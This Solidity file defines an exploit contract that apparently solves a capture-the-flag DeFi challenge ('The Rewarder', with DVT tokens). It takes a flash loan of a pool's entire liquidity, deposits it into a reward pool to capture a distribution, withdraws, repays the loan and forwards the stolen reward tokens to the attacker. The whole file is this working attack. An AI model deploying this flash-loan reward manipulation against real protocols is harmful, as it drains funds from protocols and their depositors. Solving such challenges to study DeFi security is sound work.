// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";


// Creating interface to interact with the functions of the pool contracts
interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function distributeRewards() external returns (uint256);
    function withdraw(uint256 amountToWithdraw) external;
}

contract ExploitContract {
    IFlashLoanPool immutable flashLoanPool;
    IRewardPool immutable rewardPool;
    ERC20 immutable liquidityToken;
    ERC20 immutable rewardToken;
    address attacker;



    constructor(address _flashLoanPool, address _rewardPool, address _liquidityToken, address _rewardToken)
    {
        flashLoanPool = IFlashLoanPool(_flashLoanPool);
        rewardPool = IRewardPool(_rewardPool);
        liquidityToken = ERC20(_liquidityToken);
        rewardToken = ERC20(_rewardToken);
        attacker = msg.sender; // attacker's address
    }

    function attack() external {
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool))); // call flash loan which will then functionCall into receiveFlashLoan on the TheRewarderPool.sol

    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount); // we approve the reward pool to use tokens

        rewardPool.deposit(amount); // we deposit DVT tokens into the reward pool
        rewardPool.distributeRewards(); // we distribute the rewards
        rewardPool.withdraw(amount); // we withdraw our tokens after receiving the reward tokens in this exploit contract

        liquidityToken.transfer(address(flashLoanPool), amount); // we transfer the DVT tokens from the flahs loan back to the FlashLoan contract

        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this))); // we transfer the Reward tokens in this contract to the attacker
    }
}